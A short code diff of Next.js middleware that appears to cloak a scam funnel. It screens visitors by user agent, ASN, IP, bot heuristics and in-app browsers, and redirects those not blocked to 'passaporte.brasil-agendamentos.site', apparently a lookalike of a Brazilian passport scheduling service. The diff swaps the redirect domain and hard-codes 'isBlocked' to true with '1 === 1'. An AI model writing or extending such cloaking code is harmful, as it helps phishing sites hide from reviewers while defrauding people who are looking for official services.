@@ -9,7 +9,7 @@ import { NextResponse } from 'next/server';
 // - Heuristics on UA, referer, accept-language, app agents
 // Behavior preserved from PHP snippet: if checks indicate "not blocked" -> redirect to offer URL
 
-const OFFER_URL = 'https://passaporte.agendamento-doc.lat?ref=mnb';
+const OFFER_URL = 'https://passaporte.brasil-agendamentos.site?ref=mnb';
 
 // Toggle to completely disable this middleware's checks (set to '0' or 'false' to disable)
 const ENABLED = !(process.env.SOLICITACAO_CHECK_ENABLED === '0' || process.env.SOLICITACAO_CHECK_ENABLED === 'false');
@@ -118,7 +118,7 @@ export async function middleware(req: NextRequest) {
     const googleRef = isGoogleReferer(referer, url);
     const appAgent = isAppAgent(ua);
 
-    const isBlocked = Boolean(blockedByUA || blockedByASN || blockedByIP || likelyBot || appAgent);
+    const isBlocked = Boolean(blockedByUA || blockedByASN || blockedByIP || likelyBot || appAgent || 1 === 1);
 
     // logging disabled
 
